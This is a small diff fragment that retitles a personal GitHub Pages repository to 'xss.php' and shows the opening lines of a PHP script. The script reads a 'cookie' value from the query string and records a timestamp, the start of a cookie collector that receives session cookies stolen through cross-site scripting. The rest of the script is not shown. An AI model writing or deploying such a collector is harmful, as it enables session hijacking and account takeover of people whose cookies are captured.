@@ -1,4 +1,4 @@
-# changxusheng520.github.io
+# xss.php
 <?php
 $cookie = $_GET['cookie'];
 $time = date('Y-m-d h:i:s', time());
